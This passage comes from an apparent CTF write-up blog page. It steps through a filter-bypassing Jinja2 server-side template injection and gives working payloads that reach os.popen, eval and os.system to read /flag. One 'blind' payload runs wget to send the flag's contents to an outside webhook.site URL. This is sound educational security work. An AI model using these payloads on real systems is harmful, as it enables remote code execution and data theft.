+<span class="line"><span style="color:var(--astro-code-foreground)">[</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">'__name__'</span><span style="color:var(--astro-code-token-punctuation)">:</span><span style="color:var(--astro-code-token-string-expression)"> 'jinja2.utils'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '__doc__'</span><span style="color:var(--astro-code-token-punctuation)">:</span><span style="color:var(--astro-code-token-constant)"> None</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '__package__'</span><span style="color:var(--astro-code-token-punctuation)">:</span><span style="color:var(--astro-code-token-string-expression)"> 'jinja2'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '__loader...</span></span>
+<span class="line"></span></code></pre>
+<p>You see what happened now? we got a list the all the attributes, oke now what? still “max” doesnt make any sense..</p>
+<p>Now you understand why we need something else other than map we move into popen</p>
+<p>So we said popen has just one attribute right?</p>
+<p>Yeah so let’s try the list thing, same thing right? give us a list of the attributes, in this case just popen function.</p>
+<p>Using list only wont completely work yet tho.. why? well to execute a function you have to call it, with just list we’re calling the list itself and thats not a function</p>
+<p>Payload:</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> set</span><span style="color:var(--astro-code-foreground)"> x=((lipsum</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-foreground)">)</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"attribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"__globals__"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"attribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"os"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"attribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"popen"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-constant)">list</span><span style="color:var(--astro-code-foreground)">) </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-punctuation)">}{</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(x)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-punctuation)">}</span></span>
+<span class="line"></span></code></pre>
+<p>Output:</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">[</span><span style="color:var(--astro-code-token-keyword)">&#x3C;</span><span style="color:var(--astro-code-foreground)">function popen at 0xfunction_number</span><span style="color:var(--astro-code-token-keyword)">></span><span style="color:var(--astro-code-foreground)">]</span></span>
+<span class="line"></span></code></pre>
+<p>Payload:</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> set</span><span style="color:var(--astro-code-foreground)"> x=((lipsum</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-foreground)">)</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"attribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"__globals__"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"attribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"os"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"attribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"popen"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-constant)">list</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-foreground)">last) </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-punctuation)">}{</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(x)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-punctuation)">}</span></span>
+<span class="line"></span></code></pre>
+<p>Output:</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">&#x3C;</span><span style="color:var(--astro-code-foreground)">function popen at 0xfunction_number</span><span style="color:var(--astro-code-token-keyword)">></span></span>
+<span class="line"></span></code></pre>
+<p>You see how the ‘list’ brackets are removed now? we directly accessed the popen function !!</p>
+<p>Okey now we understand why <code>list</code> and <code>last</code> can help us but they’re filtered right? :((</p>
+<p>Yep! but we can use max! why?</p>
+<p><code>max</code> will simply return the longest item in a list, and since we have one item in the final attribute (popen) max will simply return that one item ( the popen function itself )</p>
+<p>Now we simply use <code>max</code> instead of <code>|list|last</code> and we’re done!</p>
+<h1 id="solutions">Solutions</h1>
+<h2 id="lipsum-solution"><code>lipsum</code> solution :</h2>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> set</span><span style="color:var(--astro-code-foreground)"> exploit = ((lipsum</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-foreground)">)</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"at""tribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"\x5F\x5Fglo""bals\x5F\x5F"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"at""tribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"\x5F\x5Fbui""ltins\x5F\x5F"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"at""tribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"ev""al"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">max</span><span style="color:var(--astro-code-foreground)">)</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"o""pen('/fl''ag')\x2Er""ead()"</span><span style="color:var(--astro-code-token-punctuation)">)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-token-punctuation)">}{</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(exploit)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-punctuation)">}</span></span>
+<span class="line"></span></code></pre>
+<h2 id="cycler-solution"><code>cycler</code> solution :</h2>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">cycler</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">__init__</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-constant)">__globals__</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-foreground)">os</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">popen</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">'ls'</span><span style="color:var(--astro-code-token-punctuation)">).</span><span style="color:var(--astro-code-token-function)">read</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
+<span class="line"></span></code></pre>
+<p>Turned into :</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> set</span><span style="color:var(--astro-code-foreground)"> ex= ((cycler</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-foreground)">)</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"at""tribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"\x5F\x5Fin""it\x5F\x5F"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"at""tribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"\x5F\x5Fglo""bals\x5F\x5F"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"at""tribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"os"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"at""tribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"popen"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">max</span><span style="color:var(--astro-code-foreground)">)</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">'id'</span><span style="color:var(--astro-code-token-punctuation)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-punctuation)">}{</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(ex</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">max</span><span style="color:var(--astro-code-token-punctuation)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-punctuation)">}</span><span style="color:var(--astro-code-foreground)"> </span></span>
+<span class="line"></span></code></pre>
+<h2 id="blind-solution">Blind solution:</h2>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">cycler</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">__init__</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-constant)">__globals__</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-foreground)">os</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">system</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">''</span><span style="color:var(--astro-code-token-punctuation)">)</span><span style="color:var(--astro-code-foreground)"> </span></span>
+<span class="line"></span></code></pre>
+<p>since system doesnt print out the commands output and we can’t use read() on it we go blind</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> set</span><span style="color:var(--astro-code-foreground)"> ex= ((cycler</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-foreground)">)</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"at""tribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"\x5F\x5Fin""it\x5F\x5F"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"at""tribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"\x5F\x5Fglo""bals\x5F\x5F"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"at""tribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"os"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"at""tribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"sy""st""em"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">max</span><span style="color:var(--astro-code-foreground)">)</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">'wget https://webhook.site/8cc2d187-a9df-401b-8f25-0fbf1dac5c33/?c=`c''at /fl''ag`'</span><span style="color:var(--astro-code-token-punctuation)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-punctuation)">}{</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(ex)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-punctuation)">}</span></span>
+<span class="line"></span></code></pre> <div class="mt-24"> <div class="grid grid-cols-2 gap-1.5 sm:gap-3"> <a href="/blog/03-pycgi_bi0ctf" class="group relative flex flex-nowrap rounded-lg border border-black/15 px-4 py-3 pl-10 no-underline transition-colors duration-300 ease-in-out hover:bg-black/5 hover:text-black focus-visible:bg-black/5 focus-visible:text-black dark:border-white/20 dark:hover:bg-white/5 dark:hover:text-white dark:focus-visible:bg-white/5 dark:focus-visible:text-white"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="absolute left-2 top-1/2 size-5 -translate-y-1/2 fill-none stroke-current stroke-2"> <line x1="5" y1="12" x2="19" y2="12" class="translate-x-3 scale-x-0 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-hover:scale-x-100 group-focus-visible:translate-x-0 group-focus-visible:scale-x-100"></line> <polyline points="12 5 5 12 12 19" class="translate-x-1 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-focus-visible:translate-x-0"></polyline> </svg> <div class="flex items-center text-sm">PyCGI - bi0sCTF Writeup</div> </a> <a href="/blog/01-dicectfhope_writeup" class="group relative flex grow flex-row-reverse flex-nowrap rounded-lg border border-black/15 px-4 py-4 pr-10 no-underline transition-colors duration-300 ease-in-out hover:bg-black/5 hover:text-black focus-visible:bg-black/5 focus-visible:text-black dark:border-white/20 dark:hover:bg-white/5 dark:hover:text-white dark:focus-visible:bg-white/5 dark:focus-visible:text-white"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="absolute right-2 top-1/2 size-5 -translate-y-1/2 fill-none stroke-current stroke-2"> <line x1="5" y1="12" x2="19" y2="12" class="translate-x-3 scale-x-0 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-hover:scale-x-100 group-focus-visible:translate-x-0 group-focus-visible:scale-x-100"></line> <polyline points="12 5 19 12 12 19" class="-translate-x-1 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-focus-visible:translate-x-0"></polyline> </svg> <div class="flex items-center text-sm">DiceCTF@Hope 2022 - Writeup</div> </a> </div> </div> <!-- Remove github comment feature --> <!--
+        <div class="mt-24">
+          <Giscus />
+        </div>
+      --> </article> </div>  </main> <footer class="animate"> <div class="mx-auto max-w-300 px-5"> <div class="relative"> <div class="absolute -top-12 right-0"> <script type="module">typeof window<"u"&&window.addEventListener("DOMContentLoaded",()=>{const e=document.getElementById("back-to-top");e&&e.addEventListener("click",()=>{window.scrollTo({top:0,behavior:"smooth"})})});</script> <button id="back-to-top" class="group relative flex w-fit flex-nowrap rounded-sm border border-black/15 py-1.5 pl-8 pr-3 transition-colors duration-300 ease-in-out hover:bg-black/5 hover:text-black focus-visible:bg-black/5 focus-visible:text-black dark:border-white/20 dark:hover:bg-white/5 dark:hover:text-white dark:focus-visible:bg-white/5 dark:focus-visible:text-white"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="absolute left-2 top-1/2 size-4 -translate-y-1/2 rotate-90 fill-none stroke-current stroke-2"> <line x1="5" y1="12" x2="19" y2="12" class="translate-x-2 scale-x-0 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-hover:scale-x-100 group-focus-visible:translate-x-0 group-focus-visible:scale-x-100"></line> <polyline points="12 5 5 12 12 19" class="translate-x-1 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-focus-visible:translate-x-0"></polyline> </svg> <div class="text-sm">Back to top</div> </button> </div> </div> <div class="flex items-center justify-between"> <div>&copy; 2026 • j3seer </div> <div class="flex flex-wrap items-center gap-1.5"> <button id="light-theme-button" aria-label="Light theme" class="group flex size-9 items-center justify-center rounded-sm border border-black/15 hover:bg-black/5 focus-visible:bg-black/5 dark:border-white/20 dark:hover:bg-white/5 dark:focus-visible:bg-white/5"> <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="transition-colors duration-300 ease-in-out group-hover:animate-pulse group-hover:stroke-black group-focus-visible:animate-pulse group-focus-visible:stroke-black dark:group-hover:stroke-white dark:group-focus-visible:stroke-white"> <circle cx="12" cy="12" r="5"></circle> <line x1="12" y1="1" x2="12" y2="3"></line> <line x1="12" y1="21" x2="12" y2="23"></line> <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line> <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line> <line x1="1" y1="12" x2="3" y2="12"></line> <line x1="21" y1="12" x2="23" y2="12"></line> <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line> <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line> </svg> </button> <button id="dark-theme-button" aria-label="Dark theme" class="group flex size-9 items-center justify-center rounded-sm border border-black/15 hover:bg-black/5 focus-visible:bg-black/5 dark:border-white/20 dark:hover:bg-white/5 dark:focus-visible:bg-white/5"> <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="transition-colors duration-300 ease-in-out group-hover:animate-pulse group-hover:stroke-black group-focus-visible:animate-pulse group-focus-visible:stroke-black dark:group-hover:stroke-white dark:group-focus-visible:stroke-white"> <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path> </svg> </button> <button id="system-theme-button" aria-label="System theme" class="group flex size-9 items-center justify-center rounded-sm border border-black/15 hover:bg-black/5 focus-visible:bg-black/5 dark:border-white/20 dark:hover:bg-white/5 dark:focus-visible:bg-white/5"> <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="transition-colors duration-300 ease-in-out group-hover:animate-pulse group-hover:stroke-black group-focus-visible:animate-pulse group-focus-visible:stroke-black dark:group-hover:stroke-white dark:group-focus-visible:stroke-white"> <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect> <line x1="8" y1="21" x2="16" y2="21"></line> <line x1="12" y1="17" x2="12" y2="21"></line> </svg> </button> </div> </div> </div> </footer> <aside data-pagefind-ignore> <div id="backdrop" class="bg-[rgba(0, 0, 0, 0.5] invisible fixed left-0 top-0 z-50 flex h-screen w-full justify-center p-6 backdrop-blur-xs" data-astro-transition-persist="astro-3snakcvo-2"> <div id="pagefind-container" class="m-0 flex h-fit max-h-[80%] w-full max-w-(--breakpoint-sm) flex-col overflow-auto rounded-sm border border-black/15 bg-neutral-100 p-2 px-4 py-3 shadow-lg dark:border-white/20 dark:bg-neutral-900"> <div id="search" class="pagefind-ui pagefind-init" data-pagefind-ui data-bundle-path="/pagefind/" data-ui-options="{&#34;showImages&#34;:false,&#34;excerptLength&#34;:15,&#34;resetStyles&#34;:false}"></div> <script type="module" src="/_astro/Search.astro_astro_type_script_index_0_lang.DSe1Ey-Z.js"></script> <div class="mr-2 pb-1 pt-4 text-right text-xs dark:prose-invert">
+Press <span class="prose text-xs dark:prose-invert"><kbd class="">Esc</kbd></span> or click anywhere to close
+</div> </div> </div> </aside> <script>
+  const magnifyingGlass = document.getElementById("magnifying-glass");
+  const backdrop = document.getElementById("backdrop");
+
+  function openPagefind() {
+    const searchDiv = document.getElementById("search");
+    const search = searchDiv.querySelector("input");
+    setTimeout(() => {
+      search.focus();
+    }, 0);
+    backdrop?.classList.remove("invisible");
+    backdrop?.classList.add("visible");
+  }
+
+  function closePagefind() {
+    const search = document.getElementById("search");
+    search.value = "";
+    backdrop?.classList.remove("visible");
+    backdrop?.classList.add("invisible");
+  }
+
+  // open pagefind
+  magnifyingGlass?.addEventListener("click", () => {
+    openPagefind();
+  });
+
+  document.addEventListener("keydown", (e) => {
+    if (e.key === "/") {
+      e.preventDefault();
+      openPagefind();
+    } else if ((e.metaKey || e.ctrlKey) && e.key === "k") {
+      e.preventDefault();
+      openPagefind();
+    }
+  });
+
+  // close pagefind
+  document.addEventListener("keydown", (e) => {
+    if (e.key === "Escape") {
+      closePagefind();
+    }
+  });
+
+  // close pagefind when searched result(link) clicked
+  document.addEventListener("click", (event) => {
+    if (event.target.classList.contains("pagefind-ui__result-link")) {
+      closePagefind();
+    }
+  });
+
+  backdrop?.addEventListener("click", (event) => {
+    if (!event.target.closest("#pagefind-container")) {
+      closePagefind();
+    }
+  });
+
+  // prevent form submission
+  const form = document.getElementById("form");
+  form?.addEventListener("submit", (event) => {
+    event.preventDefault();
+  });
+</script>  </body></html>
